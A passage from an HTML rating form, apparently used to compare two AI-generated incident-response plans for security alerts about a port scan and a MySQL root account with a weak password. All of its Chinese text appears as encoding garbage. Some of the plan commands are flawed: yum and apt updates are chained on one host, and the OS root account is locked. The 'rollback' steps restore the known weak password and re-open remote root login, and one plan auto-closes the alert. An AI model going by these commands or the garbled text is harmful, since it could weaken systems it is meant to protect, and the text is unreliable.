   - éƒ¨ç½²ä¸»åŠ¨é˜²å¾¡ç³»ç»Ÿï¼Œå¦‚IPS/WAFï¼Œè‡ªåŠ¨æ‹¦æˆªæ¶æ„æ‰«æä¸æ”»å‡»è¡Œä¸º
   - å®šæœŸå¼€å±•å†…éƒ¨èµ„äº§è‡ªæŸ¥ä¸æ¸—é€æµ‹è¯•</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘æ¶æ„æ‰«æ
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¡ MEDIUMï¼ˆè¯„åˆ†ï¼š0.55ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘ğŸ“‹ å·²åˆ›å»ºå·¥å•ï¼Œç­‰å¾…äººå·¥å®¡æ ¸

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥18æ—¶æ•´ï¼Œå®‰å…¨ç›‘æ§ç³»ç»Ÿæ£€æµ‹åˆ°ä¸€èµ·å¤§è§„æ¨¡çš„æ¶æ„æ‰«æäº‹ä»¶ã€‚æ”»å‡»æºIPä¸º185.220.100.250ï¼Œç›®æ ‡ä¸º192.168.0.0/16ç½‘æ®µçš„å¤šä¸ªå…³é”®ç«¯å£ï¼ŒåŒ…æ‹¬22ã€80ã€443ã€3306ã€6379å’Œ27017ã€‚è¿™äº›ç«¯å£é€šå¸¸ç”¨äºSSHã€WebæœåŠ¡å’Œæ•°æ®åº“æœåŠ¡ï¼Œè¡¨æ˜æ”»å‡»è€…å¯èƒ½åœ¨å¯»æ‰¾æ½œåœ¨çš„æ¼æ´ä»¥è¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.55(medium): åŠ¨ä½œ0.80+èŒƒå›´0.50+ä¸šåŠ¡0.28 -&gt; ticket
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä¸­ç­‰é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.55ï¼‰ã€‚å·²åˆ›å»ºå·¥å•ï¼Œéœ€è¦å®‰å…¨åˆ†æå¸ˆäººå·¥å®¡æ ¸åå†³å®šå¤„ç½®æ–¹æ¡ˆã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.95

â–  å³æ—¶ç¼“è§£æªæ–½
1. å°ç¦æ”»å‡»æºIP [priority: critical]
   æè¿°: åœ¨é˜²ç«å¢™é˜»æ–­185.220.100.250çš„æ‰€æœ‰å…¥ç«™æµé‡ï¼Œé˜²æ­¢è¿›ä¸€æ­¥æ‰«æä¸æ”»å‡»
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -I INPUT -s 185.220.100.250 -j DROP
   æ‰§è¡Œå‘½ä»¤(Windows): netsh advfirewall firewall add rule name="Block_185.220.100.250" dir=in action=block remoteip=185.220.100.250
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -s 185.220.100.250 -j DROP
   å›é€€å‘½ä»¤(Windows): netsh advfirewall firewall delete rule name="Block_185.220.100.250"
   Pre-check: ç¡®è®¤185.220.100.250ä¸æ˜¯å†…éƒ¨ä¿¡ä»»IPã€VPNå‡ºå£æˆ–ä¸šåŠ¡ä¾èµ–çš„IPï¼Œå†è¿›è¡Œå°ç¦

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. æ£€æŸ¥å¹¶ä¿®å¤æš´éœ²æœåŠ¡æ¼æ´ [priority: high]
   æè¿°: å¯¹22ã€80ã€443ã€3306ã€6379ã€27017ç­‰ç«¯å£å¯¹åº”æœåŠ¡è¿›è¡Œæ¼æ´æ‰«æä¸è¡¥ä¸å‡çº§ï¼Œæ¶ˆé™¤æ½œåœ¨æ”»å‡»é¢
   æ‰§è¡Œå‘½ä»¤(Linux): for port in 22 80 443 3306 6379 27017; do nmap -p $port --script vuln 127.0.0.1; done &amp;&amp; yum update &amp;&amp; apt upgrade
   å›é€€å‘½ä»¤(Linux): yum history undo last &amp;&amp; apt-get autoremove &amp;&amp; apt-get clean
   Pre-check: åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯å‡çº§å…¼å®¹æ€§ï¼Œç¡®è®¤ä¸šåŠ¡ä½å³°æœŸæ‰§è¡Œï¼Œå¤‡ä»½å…³é”®æ•°æ®

2. é™åˆ¶æš´éœ²ç«¯å£è®¿é—®æ¥æº [priority: high]
   æè¿°: å°†22ã€3306ã€6379ã€27017ç­‰é«˜å±ç«¯å£ä»…å¯¹è¿ç»´ç®¡ç†ç½‘æ®µå¼€æ”¾ï¼Œå‡å°‘æš´éœ²é¢
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -A INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -s 10.0.0.0/8 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -j DROP
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -p tcp -m multiport --dports 22,3306,6379,27017 -j DROP
   Pre-check: ç¡®è®¤å…è®¸çš„ç®¡ç†ç½‘æ®µèŒƒå›´è¦†ç›–æ‰€æœ‰åˆæ³•è¿ç»´ç»ˆç«¯ï¼Œé¿å…è¯¯é”ä¸šåŠ¡

â–  é¢„é˜²åŠ å›ºæªæ–½
1. åŠ å›ºWebåŠæ•°æ®åº“æœåŠ¡å®‰å…¨é…ç½® [priority: medium]
   æè¿°: å…³é—­æœªç”¨æœåŠ¡ã€ç¦ç”¨é»˜è®¤è´¦æˆ·ã€è®¾ç½®å¼ºå¯†ç ï¼Œæå‡æš´éœ²æœåŠ¡å®‰å…¨æ€§
   æ‰§è¡Œå‘½ä»¤(Linux): systemctl disable redis &amp;&amp; systemctl stop redis &amp;&amp; usermod -L root &amp;&amp; passwd -l root
   å›é€€å‘½ä»¤(Linux): systemctl enable redis &amp;&amp; systemctl start redis &amp;&amp; usermod -U root &amp;&amp; passwd -u root
   Pre-check: ç¡®è®¤redisã€MongoDBç­‰æœåŠ¡æ˜¯å¦å®é™…éœ€è¦ï¼Œroot/Administratorè´¦æˆ·ç¦ç”¨å‰ç¡®è®¤æœ‰å…¶ä»–ç®¡ç†å‘˜è´¦æˆ·å¯ç”¨

2. å¯ç”¨å¼‚å¸¸è®¿é—®è¡Œä¸ºç›‘æ§ [priority: medium]
   æè¿°: éƒ¨ç½²IDS/IPSæˆ–æ—¥å¿—å®¡è®¡ï¼Œå®æ—¶æŠ¥è­¦å¼‚å¸¸æ‰«æä¸æš´åŠ›ç ´è§£è¡Œä¸º
   æ‰§è¡Œå‘½ä»¤(Linux): apt install suricata &amp;&amp; systemctl enable suricata &amp;&amp; systemctl start suricata
   å›é€€å‘½ä»¤(Linux): systemctl stop suricata &amp;&amp; apt remove suricata
   Pre-check: ç¡®è®¤ä¸»æœºæ€§èƒ½æ»¡è¶³IDS/IPSéƒ¨ç½²è¦æ±‚ï¼Œæœªä¸ç°æœ‰å®‰å…¨äº§å“å†²çª</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(5)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(5)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-6">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #6: Case20_å¼±å¯†ç </h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘å¼±å¯†ç æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 19:30:00
ã€ç›®æ ‡ä¸»æœºã€‘192.168.1.150
ã€æœåŠ¡ã€‘MySQL 3306
ã€ç”¨æˆ·åã€‘root
ã€å¨èƒç­‰çº§ã€‘ä½å±
ã€æ”»å‡»ç±»å‹ã€‘å¼±å£ä»¤
ã€ATT&amp;CKã€‘å‡­è¯è®¿é—®:TA0006|æš´åŠ›ç ´è§£:T1110
ã€æ£€æµ‹æ–¹å¼ã€‘å†…éƒ¨åˆè§„æ‰«æ
ã€å‘Šè­¦æè¿°ã€‘å†…éƒ¨åˆè§„æ‰«æå‘ç°MySQLæ•°æ®åº“rootè´¦æˆ·ä½¿ç”¨å¼±å¯†ç ï¼ˆpassword123ï¼‰ï¼Œå­˜åœ¨è¢«æš´åŠ›ç ´è§£é£é™©ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ä¿®æ”¹ä¸ºå¼ºå¯†ç ï¼Œé™åˆ¶rootè´¦æˆ·è¿œç¨‹ç™»å½•ï¼Œå¯ç”¨å¯†ç å¤æ‚åº¦ç­–ç•¥</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>## äº‹ä»¶æè¿°
åœ¨2025å¹´12æœˆ4æ—¥19:30ï¼Œå®‰å…¨ç³»ç»Ÿé€šè¿‡å†…éƒ¨åˆè§„æ‰«æå‘ç°ï¼Œä½äº192.168.1.150ä¸»æœºä¸Šçš„MySQLæœåŠ¡ï¼ˆç«¯å£3306ï¼‰å­˜åœ¨rootè´¦æˆ·ä½¿ç”¨å¼±å¯†ç "password123"çš„æƒ…å†µã€‚è¿™ç§å¼±å¯†ç ææ˜“è¢«æ”»å‡»è€…é€šè¿‡æš´åŠ›ç ´è§£ç­‰æ–¹å¼è·å–ï¼Œä»è€Œé€ æˆæ•°æ®åº“è¢«éæ³•è®¿é—®çš„é£é™©ã€‚

## æ”»å‡»åˆ†ç±»
å‡­è¯è®¿é—®ï¼ˆCredential Accessï¼‰- æš´åŠ›ç ´è§£ï¼ˆBrute Forceï¼‰  
å±äºå¼±å£ä»¤ç®¡ç†å¯¼è‡´çš„å®‰å…¨éšæ‚£ã€‚

## é£é™©è¯„ä¼°
**é£é™©ç­‰çº§ï¼šä¸­**  
**ç†ç”±ï¼š**  
è™½ç„¶æ­¤æ¬¡å‘Šè­¦æ˜¯ç”±å†…éƒ¨åˆè§„æ‰«æå‘ç°ï¼Œå°šæœªæœ‰å¤–éƒ¨æ”»å‡»è¡Œä¸ºå‘ç”Ÿï¼Œä½†rootè´¦æˆ·ä½œä¸ºMySQLæ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·ï¼Œå…¶å¼±å¯†ç ææ˜“è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚

## å¤„ç½®å»ºè®®

### 1. å³æ—¶ç¼“è§£æªæ–½
- ç«‹å³ä¸ºMySQL rootè´¦æˆ·è®¾ç½®é«˜å¼ºåº¦å¯†ç ï¼ˆåŒ…å«å¤§å°å†™å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦ä¸å°‘äº12ä½ï¼‰
- æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸ç™»å½•è¡Œä¸ºï¼Œæ’æŸ¥æ˜¯å¦å·²è¢«å…¥ä¾µ
- ä¸´æ—¶é™åˆ¶rootè´¦æˆ·çš„è¿œç¨‹ç™»å½•æƒé™ï¼Œä»…å…è®¸æœ¬åœ°è¿æ¥

### 2. æ ¹å› ä¿®å¤æ–¹æ¡ˆ
- æ£€æŸ¥æ‰€æœ‰MySQLç”¨æˆ·è´¦æˆ·ï¼Œç¡®ä¿ä¸å­˜åœ¨å…¶ä»–å¼±å¯†ç è´¦æˆ·
- å¯ç”¨MySQLå¯†ç å¤æ‚åº¦æ’ä»¶ï¼ˆå¦‚validate_passwordï¼‰ï¼Œå¼ºåˆ¶æ‰§è¡Œå¯†ç å¤æ‚åº¦ç­–ç•¥
- ç¦æ­¢rootè´¦æˆ·è¿œç¨‹ç™»å½•ï¼ˆå°†hostè®¾ä¸ºlocalhostï¼‰

### 3. é¢„é˜²åŠ å›ºæªæ–½
- å»ºç«‹å®šæœŸçš„å¼±å£ä»¤æ‰«æå’Œåˆè§„æ£€æŸ¥æœºåˆ¶
- å¯¹æ‰€æœ‰æ•°æ®åº“è´¦æˆ·å®šæœŸå¼ºåˆ¶æ›´æ¢å¯†ç 
- å¯ç”¨MySQLçš„æ—¥å¿—å®¡è®¡åŠŸèƒ½ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸æ“ä½œ</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘å¼±å£ä»¤/æš´åŠ›ç ´è§£
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¢ LOWï¼ˆè¯„åˆ†ï¼š0.37ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘âœ… å‘Šè­¦å·²å…³é—­

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥19:30ï¼Œä¸€æ¬¡å†…éƒ¨åˆè§„æ‰«æåœ¨192.168.1.150ä¸»æœºä¸Šå‘ç°äº†ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚MySQLæœåŠ¡çš„rootè´¦æˆ·ä½¿ç”¨äº†ä¸€ä¸ªå¼±å¯†ç ï¼ˆpassword123ï¼‰ï¼Œè¿™ä½¿å¾—ç³»ç»Ÿå®¹æ˜“å—åˆ°æš´åŠ›ç ´è§£æ”»å‡»çš„å¨èƒã€‚è™½ç„¶å½“å‰å¨èƒç­‰çº§è¢«è¯„ä¼°ä¸ºä½å±ï¼Œä½†å¦‚æœä¸åŠæ—¶å¤„ç†ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™ä¸€æ¼æ´è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®ã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.37(low): åŠ¨ä½œ0.50+èŒƒå›´0.30+ä¸šåŠ¡0.28 -&gt; close
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä½é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.37ï¼‰ã€‚é£é™©è¾ƒä½ï¼Œç³»ç»Ÿå·²è‡ªåŠ¨å…³é—­è¯¥å‘Šè­¦ã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.95

â–  å³æ—¶ç¼“è§£æªæ–½
1. ç«‹å³ä¿®æ”¹MySQL rootè´¦æˆ·å¯†ç  [priority: critical]
   æè¿°: å°†MySQL rootè´¦æˆ·å¯†ç æ›´æ”¹ä¸ºé«˜å¼ºåº¦éšæœºå¯†ç ï¼Œç«‹å³æ¶ˆé™¤å¼±å£ä»¤é£é™©
   æ‰§è¡Œå‘½ä»¤(Linux): mysql -uroot -ppassword123 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New_Str0ng!P@ssw0rd';"
   æ‰§è¡Œå‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -ppassword123 -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'New_Str0ng!P@ssw0rd';"
   å›é€€å‘½ä»¤(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123';"
   å›é€€å‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'password123';"
   Pre-check: ç¡®è®¤rootè´¦æˆ·å½“å‰å¯†ç ä¸ºpassword123ï¼Œä¸”æœ‰æ•°æ®åº“æ“ä½œæƒé™ã€‚å»ºè®®æå‰å¤‡ä»½æ•°æ®åº“

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. é™åˆ¶MySQL rootè´¦æˆ·è¿œç¨‹ç™»å½• [priority: high]
   æè¿°: åªå…è®¸rootè´¦æˆ·æœ¬åœ°ç™»å½•ï¼Œé˜²æ­¢è¿œç¨‹æš´åŠ›ç ´è§£
   æ‰§è¡Œå‘½ä»¤(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
   æ‰§è¡Œå‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='localhost' WHERE User='root'; FLUSH PRIVILEGES;"
   å›é€€å‘½ä»¤(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='%' WHERE User='root'; FLUSH PRIVILEGES;"
   å›é€€å‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UPDATE mysql.user SET Host='%' WHERE User='root'; FLUSH PRIVILEGES;"
   Pre-check: ç¡®è®¤ä¸šåŠ¡ç³»ç»Ÿä¸ä¾èµ–rootè¿œç¨‹ç™»å½•ï¼Œå»ºè®®æå‰æµ‹è¯•ä¸šåŠ¡è¿é€šæ€§

â–  é¢„é˜²åŠ å›ºæªæ–½
1. å¯ç”¨MySQLå¯†ç å¤æ‚åº¦ç­–ç•¥ [priority: medium]
   æè¿°: å¼ºåˆ¶MySQLè´¦æˆ·ä½¿ç”¨å¤æ‚å¯†ç ï¼Œé˜²æ­¢å¼±å£ä»¤å†æ¬¡å‡ºç°
   æ‰§è¡Œå‘½ä»¤(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "INSTALL PLUGIN validate_password SONAME 'validate_password.so'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
   æ‰§è¡Œå‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "INSTALL PLUGIN validate_password SONAME 'validate_password.dll'; SET GLOBAL validate_password.policy=STRONG; SET GLOBAL validate_password.length=12;"
   å›é€€å‘½ä»¤(Linux): mysql -uroot -pNew_Str0ng!P@ssw0rd -e "UNINSTALL PLUGIN validate_password;"
   å›é€€å‘½ä»¤(Windows): "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -uroot -pNew_Str0ng!P@ssw0rd -e "UNINSTALL PLUGIN validate_password;"
   Pre-check: ç¡®è®¤MySQLæœªå®‰è£…validate_passwordæ’ä»¶æ—¶éœ€å…ˆå®‰è£…ï¼Œä¸”ä¸šåŠ¡å¯†ç ç¬¦åˆæ–°ç­–ç•¥è¦æ±‚

2. ç›‘æ§MySQLç™»å½•å¤±è´¥è¡Œä¸º [priority: medium]
   æè¿°: é…ç½®MySQLæ—¥å¿—è®°å½•å¹¶ç›‘æ§æš´åŠ›ç ´è§£è¿¹è±¡
   æ‰§è¡Œå‘½ä»¤(Linux): sed -i '/^log_error/s/^#//' /etc/my.cnf &amp;&amp; sed -i '/^log_error/s|=.*|=/var/log/mysql/error.log|' /etc/my.cnf &amp;&amp; systemctl restart mysqld
   æ‰§è¡Œå‘½ä»¤(Windows): powershell -Command "(Get-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini') -replace ';log_error', 'log_error' | Set-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini'; Restart-Service MySQL80"
   å›é€€å‘½ä»¤(Linux): sed -i '/^log_error/s/^/;/' /etc/my.cnf &amp;&amp; systemctl restart mysqld
   å›é€€å‘½ä»¤(Windows): powershell -Command "(Get-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini') -replace 'log_error', ';log_error' | Set-Content 'C:\ProgramData\MySQL\MySQL Server 8.0\my.ini'; Restart-Service MySQL80"
   Pre-check: ç¡®è®¤/var/log/mysql/error.logæœ‰è¶³å¤Ÿç£ç›˜ç©ºé—´ï¼ŒWindowsä¸‹æ—¥å¿—è·¯å¾„æ­£ç¡®ï¼Œé‡å¯æ•°æ®åº“å‰é€šçŸ¥ä¸šåŠ¡</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
